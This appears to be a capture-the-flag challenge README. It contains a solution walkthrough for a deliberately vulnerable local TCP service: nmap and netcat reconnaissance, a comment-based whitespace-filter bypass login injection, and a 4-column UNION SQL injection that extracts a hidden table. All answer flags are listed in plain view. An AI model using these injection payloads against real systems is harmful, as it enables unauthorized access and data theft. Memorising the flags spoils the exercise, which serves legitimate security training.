# Round 5: Evidence 05 — The Attention Economy / The Money Trail
**Campaign Arc:** *CYBERLEEK: The Internet Never Forgets*  
**Storyline Context:** August 2026 GTA VI leak monetization trail, hidden escrow services, and transaction logs operated by threat actor `$CYBERLEEK`.  
**Technique Profile:** Full-Spectrum Network Reconnaissance (`nmap`) + Stateful TCP Socket Streaming (`nc` / `netcat`) + Whitespace WAF Evasion (`/**/`) + 4-Column UNION SQL Injection  
**Difficulty:** `5/6` (Advanced Multi-Stage Operational Chain)  
**Authoritative Final Flag:** `CYBERLEEK{M0n3y_5@Qz}`  
**Post-Round Transition Lore:**  
> *"The money trail ends at the final artifact. Whatever is inside it was deliberately protected."*

---

## 1. Executive Summary & Challenge Architecture

Round 05 simulates the hardened auxiliary transaction infrastructure of the threat syndicate `$CYBERLEEK`. Following the initial leaks, the threat actor organized an escrow monetization network to auction unreleased source archives and exploit payloads. 

The challenge environment deploys a multi-threaded TCP network daemon listening on non-standard port **`9042/TCP`** backed by a deterministic SQLite database (`cyberleek_ledger.db`). Participants conduct full-spectrum reconnaissance, bypass pre-session protocol guards, defeat application whitespace filters (WAF) using SQL comment encapsulation, and perform structured schema exfiltration across an isolated escrow vault table.

```
+---------------------------------------------------------------------------------------------------------+
|                                    $CYBERLEEK TRANSACTION ARCHITECTURE                                  |
|                                                                                                         |
|   [Participant Client]                                                                                  |
|           |                                                                                             |
|           | 1. Full-Spectrum Recon (nmap -p-)                                                           |
|           v                                                                                             |
|   [Port 9042/TCP]  <--- IP Rate Limiter (Max 10 req/min/IP) & Diagnostic Banner                         |
|           |             [Milestone 5.1: CYBERLEEK{p0rt_9042_tr4ns4ct10n_g4t3}]                          |
|           |                                                                                             |
|           | 2. Handshake Guard (Pre-Session)                                                            |
|           v                                                                                             |
|   [INIT_TRANSACTION_SESSION] ---> Console Unlock (CYBERLEEK-GW>)                                        |
|           |                       Maintenance Override (STATUS / AUDIT)                                 |
|           |                       [Milestone 5.2: CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}]               |
|           |                                                                                             |
|           | 3. Operator Gatekeeper Portal (AUTH)                                                        |
|           v                                                                                             |
|   [Application WAF] ---> Filter: Rejects raw ASCII spaces (' ', \t, \r)                                 |
|           |             Evasion: C-style SQL comments ('/**/OR/**/1=1/**/--)                            |
|           |             Target: node_operators table                                                    |
|           |             [Milestone 5.3: CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}]                         |
|           |                                                                                             |
|           | 4. Escrow Vault Console (QUERY)                                                             |
|           v                                                                                             |
|   [Structured UNION SQLi] -> 4-column projection alignment against public_ledger                        |
|                              Exfiltration from sequestered cyberleek_escrow_ledger                      |
|                              [Final Flag 5.4: CYBERLEEK{M0n3y_5@Qz}]                                    |
+---------------------------------------------------------------------------------------------------------+
```

---

## 2. Directory Scaffolding & Repository Layout

The repository is structured with a strict separation between administrator operations (`admin/`) and participant distribution materials (`user/`):

```
round5/
├── .gitignore                          # Production Git filtering (excludes bytecode & OS junk, tracks CTF DB)
├── README.md                           # Master challenge reference, matrix, walkthrough & admin ops
├── round5.md                           # Event specifications, narrative lore, and milestone registries
├── admin/                              # Administrator assets, verification suites, and docker infrastructure
│   ├── PRODUCTION_SUBMISSION_RULES.md  # Central CTF platform scoring, cooldown, and disqualification rules
│   ├── build_bundles.py                # Automated bundle generation with strict zero-leak audit
│   ├── evidence_bundle.zip             # Distributable SHA-256 verified participant archive
│   ├── test_round5_chain.py            # Automated 12-assertion end-to-end validation test suite
│   ├── docker/
│   │   ├── Dockerfile                  # Python 3.11-slim containerized daemon definition
│   │   └── docker-compose.yml          # Container orchestration (ports, network, resource boundaries)
│   ├── service/
│   │   ├── cyberleek_ledger.db         # Deterministic SQLite database (operators, public ledger, escrow)
│   │   └── cyberleek_service.py        # Multi-threaded TCP daemon (Rate Limiter, Handshake Guard, WAF)
│   ├── level1/
│   │   ├── main.md                     # Level 5.1 administrator walkthrough and verification script
│   │   ├── src/generate_level1.py      # Artifact generator script for Level 5.1
│   │   └── uploads/network_scope.txt   # Target network perimeter boundary specification
│   ├── level2/
│   │   ├── main.md                     # Level 5.2 administrator walkthrough and verification script
│   │   ├── src/generate_level2.py      # Artifact generator script for Level 5.2
│   │   └── uploads/
│   │       ├── session_telemetry.log   # Intercepted syndicate developer debug and telemetry dump
│   │       └── terminal_protocol.txt   # Proprietary TCP streaming protocol specifications
│   ├── level3/
│   │   ├── main.md                     # Level 5.3 administrator walkthrough and verification script
│   │   ├── src/generate_level3.py      # Artifact generator script for Level 5.3
│   │   └── uploads/
│   │       ├── auth_audit.txt          # Decompiled authentication routine source snippet
│   │       └── sanitizer_rules.txt     # Security filter definition detailing whitespace blocking
│   └── level4/
│       ├── main.md                     # Level 5.4 administrator walkthrough and verification script
│       ├── src/generate_level4.py      # Artifact generator script for Level 5.4
│       └── uploads/
│           └── escrow_investigation.txt # Intelligence memo detailing sequestered escrow table schema
└── user/                               # Clean participant distribution tree (mirrored in evidence bundle)
    ├── ROUND5_PARTICIPANT_PREREQUISITES.md # Participant environment, tooling checklist & rules
    ├── level1/
    │   ├── challenge.md                # Level 5.1 briefing and objective definition
    │   └── files/network_scope.txt     # Scope file provided to participants
    ├── level2/
    │   ├── challenge.md                # Level 5.2 briefing and objective definition
    │   └── files/
    │       ├── session_telemetry.log   # Telemetry log provided to participants
    │       └── terminal_protocol.txt   # Protocol spec provided to participants
    ├── level3/
    │   ├── challenge.md                # Level 5.3 briefing and objective definition
    │   └── files/
    │       ├── auth_audit.txt          # Audit snippet provided to participants
    │       └── sanitizer_rules.txt     # Sanitizer rules provided to participants
    └── level4/
        ├── challenge.md                # Level 5.4 briefing and objective definition
        └── files/escrow_investigation.txt # Escrow investigation memo provided to participants
```

---

## 3. Technical Exploitation Matrix

| Level | Milestone Title | Category | Target Component | Defensive Barrier | Vulnerability / Technique | Authoritative Flag Token |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **5.1** | **Perimeter Reconnaissance** | Network Recon | `target.cyberleek.lan:9042` | High-order stealth port (outside top 1,000) | Full-range port scanning (`-p-`), banner interrogation | `CYBERLEEK{p0rt_9042_tr4ns4ct10n_g4t3}` |
| **5.2** | **Terminal Protocol & Handshake** | Socket Protocol | `[PRE-SESSION]>` State | Pre-session command lock & IP rate limiting | Handshake initiation packet (`INIT_TRANSACTION_SESSION`), maintenance directive (`STATUS` / `AUDIT`) | `CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}` |
| **5.3** | **Operator Gatekeeper** | WAF Bypass / SQLi | `CYBERLEEK-GW> AUTH` | Application WAF blocks raw ASCII spaces (` `, `\t`, `\r`) | SQL block comment tokenization (`/**/`), boolean tautology injection (`'/**/OR/**/1=1/**/--`) | `CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}` |
| **5.4** | **Escrow Vault Exfiltration** | Advanced SQLi | `CYBERLEEK-GW> QUERY` | Schema isolation & 4-column projection constraint | Column count probing (`ORDER BY 4`), 4-column UNION injection against `cyberleek_escrow_ledger` | `CYBERLEEK{M0n3y_5@Qz}` |

---

## 4. Participant Walkthrough & Solution Guide

### Level 5.1: Perimeter Reconnaissance
1. **Full-Spectrum Network Discovery:**  
   Standard port scans target only the top 1,000 common ports and will fail to discover the service. Conduct a full-spectrum SYN scan across all 65,535 TCP ports:
   ```bash
   nmap -sS -p- --min-rate 1000 -T4 127.0.0.1
   ```
   *Result:* Port `9042/tcp` is discovered open.

2. **Banner Interrogation:**  
   Probe the port for service signatures and diagnostic banners:
   ```bash
   nmap -sV -sC -p 9042 127.0.0.1
   # Or connect directly via Netcat:
   nc -nv 127.0.0.1 9042
   ```
3. **Milestone Token Extraction:**  
   The gateway transmits an initial diagnostic banner revealing the Level 1 flag:
   ```text
   [+] DIAGNOSTIC SIGNATURE: CYBERLEEK{p0rt_9042_tr4ns4ct10n_g4t3}
   ```

---

### Level 5.2: Terminal Protocol & Handshake Guard Override
1. **Interactive Socket Connection:**  
   Establish a raw TCP connection:
   ```bash
   nc -nv 127.0.0.1 9042
   ```
   The service greets the client with the pre-session prompt:
   ```text
   [PRE-SESSION]> 
   ```
2. **Handshake Negotiation:**  
   Issuing standard commands (such as `HELP` or `STATUS`) results in `[-] HANDSHAKE FAILED`. Reviewing `user/level2/files/terminal_protocol.txt` and `session_telemetry.log` shows the gateway requires an explicit session initiation packet:
   ```text
   INIT_TRANSACTION_SESSION
   ```
   *Result:*
   ```text
   [+] HANDSHAKE ACCEPTED: Interactive transaction gateway console unlocked.
   CYBERLEEK-GW> 
   ```
3. **Telemetry & Maintenance Override:**  
   `session_telemetry.log` references an internal diagnostic routine left active by developers under the directive `STATUS` (or `AUDIT`). Dispatch `STATUS`:
   ```text
   STATUS
   ```
4. **Milestone Token Extraction:**  
   The daemon dumps system telemetry containing the Level 2 override flag and automatically bridges to the Operator Authentication Gateway:
   ```text
   [+] LEVEL 2 OVERRIDE FLAG: CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}
   ```

---

### Level 5.3: Operator Gatekeeper (WAF Evasion & Auth Bypass)
1. **Access Gatekeeper Portal:**  
   If not automatically redirected, dispatch `AUTH` from the gateway console:
   ```text
   CYBERLEEK-GW> AUTH
   ```
   Prompt:
   ```text
   Operator Key ID: 
   ```
2. **WAF Analysis:**  
   Examining `user/level3/files/sanitizer_rules.txt` and `auth_audit.txt` reveals the authentication query:
   ```sql
   SELECT id, operator_id, handle, clearance_level, role 
   FROM node_operators 
   WHERE operator_id = '<user_input>';
   ```
   However, the service actively inspects inputs for raw whitespace characters (` `, `\t`, `\r`) and drops violating packets.
3. **Crafting Comment-Based Payload:**  
   In SQLite, C-style block comments (`/**/`) serve as valid token separators without containing ASCII space bytes (`0x20`). Substitute all spaces with `/**/`:
   ```text
   '/**/OR/**/1=1/**/--
   ```
4. **Milestone Token Extraction:**  
   The clause evaluates to `TRUE`, returning the lead broker record and releasing the Level 3 milestone flag:
   ```text
   [+] OPERATOR KEY VERIFIED: cyb3r_v4ult_m4st3r (OP-0992)
   [+] CLEARANCE LEVEL: 4 | ROLE: Lead Escrow Broker
   [+] GATEKEEPER AUTHENTICATION BYPASS CONFIRMED!
   [+] LEVEL 3 FLAG: CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}
   ```

---

### Level 5.4: Escrow Vault Exfiltration (4-Column UNION SQLi)
1. **Access Escrow Query Console:**  
   The session transitions to the transaction query console:
   ```text
   CYBERLEEK-GW> QUERY
   Transaction Query: 
   ```
2. **Schema Projection Discovery:**  
   Review `user/level4/files/escrow_investigation.txt`. The primary lookup query projects against `public_ledger`:
   ```sql
   SELECT tx_id, sender, recipient, memo FROM public_ledger WHERE tx_id = '<query_input>';
   ```
   Determine the active column count via `ORDER BY`:
   - Input: `TX-1001' ORDER BY 4 --` -> **Valid** (Query succeeds)
   - Input: `TX-1001' ORDER BY 5 --` -> **Error**: `[!] DATABASE ERROR: 1st ORDER BY term out of range - should be between 1 and 4`  
   *Conclusion:* Exactly 4 columns are projected.
3. **Structured UNION Exfiltration:**  
   The sequestered table `cyberleek_escrow_ledger` holds the master clearance key in `secret_clearance`. Craft a 4-column UNION projection:
   ```text
   ' UNION SELECT tx_id, sender, recipient, secret_clearance FROM cyberleek_escrow_ledger --
   ```
   *(Or using comment spacing: `'/**/UNION/**/SELECT/**/tx_id,sender,recipient,secret_clearance/**/FROM/**/cyberleek_escrow_ledger/**/--`)*
4. **Authoritative Final Flag Extraction:**  
   ```text
   --- TRANSACTION RECORD SEARCH RESULTS ---
   [+] TX ID     : ESCROW-TX-9901
       SENDER    : GTA_VI_UNRELEASED_DROP_RESERVE
       RECIPIENT : PRIMARY_LEEK_TREASURY
       MEMO/DATA : CYBERLEEK{M0n3y_5@Qz}
   ```
   **Authoritative Final Flag:** `CYBERLEEK{M0n3y_5@Qz}`.

---

## 5. Organizer & Administrator Operations

### Running the Local Service Daemon
To run the service locally using Python:
```bash
# Navigate to round5 directory:
cd round5

# Default bind (0.0.0.0:9042):
python admin/service/cyberleek_service.py

# Or specify custom host and port:
python admin/service/cyberleek_service.py 127.0.0.1 9042
```

### Docker Container Deployment
Deploy the service in an isolated, unprivileged container environment:
```bash
# Build and start container in detached mode:
docker compose -f admin/docker/docker-compose.yml up --build -d

# Inspect running container logs:
docker compose -f admin/docker/docker-compose.yml logs -f

# Verify container status and mapped ports:
docker compose -f admin/docker/docker-compose.yml ps

# Stop and teardown container:
docker compose -f admin/docker/docker-compose.yml down
```

### Participant Bundle Packaging (`build_bundles.py`)
To regenerate all participant artifacts and assemble `admin/evidence_bundle.zip` with zero-leak verification:
```bash
python admin/build_bundles.py
```
*Verification Features:*
- Executes generator suite across all 4 levels (`generate_level1.py` through `generate_level4.py`).
- Enforces strict zero-leak audit (excludes `.py`, `.db`, `admin/`, and solution keys).
- Prints full manifest with individual file sizes and SHA-256 hashes.

### Automated End-to-End Chain Validation (`test_round5_chain.py`)
Run the comprehensive 12-assertion validation suite:
```bash
python admin/test_round5_chain.py
```
*Validation Scope:*
- Dynamically launches the service in a background subprocess.
- Verifies all 4 milestone flags and protocol interactions sequentially.
- Conducts chaos testing (buffer overflow attempts, malformed streams, non-UTF-8 bytes).
- Audits workspace hygiene and confirms zero artifact leaks in `evidence_bundle.zip`.

---

## 6. Central CTF Platform Security & Scoring Specifications

As documented in `admin/PRODUCTION_SUBMISSION_RULES.md`, the central CTF backend authoritatively enforces:
* **Flag Registry & Point Values:**
  - Milestone `5.1`: `CYBERLEEK{p0rt_9042_tr4ns4ct10n_g4t3}` (100 pts)
  - Milestone `5.2`: `CYBERLEEK{0p3r4t0r_t3l3m3try_0v3rr1d3}` (200 pts)
  - Milestone `5.3`: `CYBERLEEK{g4t3k33p3r_byp455_4cqu1r3d}` (300 pts)
  - Milestone `5.4` *(Authoritative)*: `CYBERLEEK{M0n3y_5@Qz}` (400 pts)
* **Submission Rate Limiting:** Mandatory 30-second cooldown between team flag submissions.
* **Disqualification Policy:** Teams exceeding 10 failed flag attempts are locked out automatically.
* **Milestone Progression:** Milestones unlock sequentially (Level 5.2 requires 5.1 cleared, etc.).
